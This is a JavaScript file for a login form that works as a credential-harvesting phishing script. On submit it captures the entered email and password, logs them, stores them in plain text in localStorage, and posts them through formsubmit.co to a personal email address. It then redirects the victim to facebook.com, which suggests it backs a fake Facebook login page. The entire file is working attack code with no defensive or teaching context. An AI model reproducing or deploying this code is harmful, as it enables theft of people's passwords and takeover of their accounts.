document
  .getElementById("login-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent form submission

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Log the input data to the console
    console.log("Email:", email);
    console.log("Password:", password);

    // Save the input data to local storage
    localStorage.setItem("email", email);
    localStorage.setItem("password", password);

    // Send the data to your email address
    fetch("https://formsubmit.co/ajax/eng.sagar.aiub@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email: email,
        password: password,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Email sent successfully:", data);
        window.location.href = "https://www.facebook.com/"; // Redirect after sending email
      })
      .catch((error) => {
        console.error("Error sending email:", error);
        alert("Failed to send data to your email.");
      });
  });
